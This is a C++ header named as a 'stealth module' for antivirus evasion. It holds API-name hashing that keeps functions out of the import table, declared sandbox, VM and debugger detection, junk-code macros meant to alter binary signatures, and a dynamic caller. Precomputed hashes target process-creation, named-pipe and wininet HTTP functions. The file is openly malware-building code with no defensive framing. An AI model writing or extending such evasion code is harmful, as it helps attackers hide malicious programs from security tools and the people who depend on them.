#pragma once
#include <windows.h>
#include <vector>
#include <string>

// ════════════════════════════════════════════════════════════════════════════
//  STEALTH MODULE - Foundation for AV Evasion
// ════════════════════════════════════════════════════════════════════════════

namespace Stealth {

    // --- API Hashing ---
    // Instead of using function names (which show up in the IAT), we use hashes.
    constexpr DWORD HashApi(const char* str) {
        unsigned int hash = 5381;
        int c;
        while ((c = *str++))
            hash = ((hash << 5) + hash) + c; // hash * 33 + c
        return hash;
    }

    // Resolves a function address by its name hash within a module.
    FARPROC GetApiByHash(HMODULE hModule, DWORD funcHash);

    // --- Anti-Analysis ---
    // Returns true if a sandbox, VM, or debugger is detected.
    bool IsBeingAnalyzed();

    // Early initialization - call this at the very beginning of main()
    void Initialize();

    // --- Junk Code / Mutation ---
    // Macros to insert harmless but confusing code to change the binary signature.
    // (Safe for both x86 and x64)
    #define JUNK_CODE_SMALL \
        { \
            volatile int x = 10; \
            volatile int y = 20; \
            if ((x + y) == 0) { /* should never happen */ \
                ExitProcess(0); \
            } \
        }

    // --- String Obfuscation Integration ---
    // Helper for the user's Obfuscator
    #define DECRYPT_W(data, key) Obfuscator::DecryptW(data, key)
}

// ════════════════════════════════════════════════════════════════════════════
//  DYNAMIC API CALLER
// ════════════════════════════════════════════════════════════════════════════

// Template helper for type-safe dynamic calls
template<typename T>
struct ApiWrapper;

template<typename Ret, typename... Args>
struct ApiWrapper<Ret(WINAPI*)(Args...)> {
    using FuncPtr = Ret(WINAPI*)(Args...);

    static Ret Call(const wchar_t* moduleName, DWORD hash, Args... args) {
        HMODULE hMod = GetModuleHandleW(moduleName);
        if (!hMod) hMod = LoadLibraryW(moduleName);
        if (!hMod) return Ret();

        FuncPtr func = reinterpret_cast<FuncPtr>(Stealth::GetApiByHash(hMod, hash));
        if (!func) return Ret();

        return func(args...);
    }
};

// Convenient macro for calling APIs
// Usage: CALL_API(L"kernel32.dll", Hashes::CreateProcessW, CreateProcessW)(...)
#define CALL_API(moduleName, hash, funcName) \
    ApiWrapper<decltype(&funcName)>::Call(moduleName, hash)

// ════════════════════════════════════════════════════════════════════════════
//  PRE-DEFINED HASHES (Loud APIs)
// ════════════════════════════════════════════════════════════════════════════

namespace Hashes {
    // kernel32.dll
    constexpr DWORD CreateProcessW       = Stealth::HashApi("CreateProcessW");
    constexpr DWORD TerminateProcess     = Stealth::HashApi("TerminateProcess");
    constexpr DWORD CreateNamedPipeW     = Stealth::HashApi("CreateNamedPipeW");
    constexpr DWORD ConnectNamedPipe     = Stealth::HashApi("ConnectNamedPipe");

    // wininet.dll
    constexpr DWORD InternetOpenW        = Stealth::HashApi("InternetOpenW");
    constexpr DWORD InternetOpenUrlW     = Stealth::HashApi("InternetOpenUrlW");
    constexpr DWORD InternetReadFile      = Stealth::HashApi("InternetReadFile");
    constexpr DWORD HttpSendRequestW     = Stealth::HashApi("HttpSendRequestW");
}
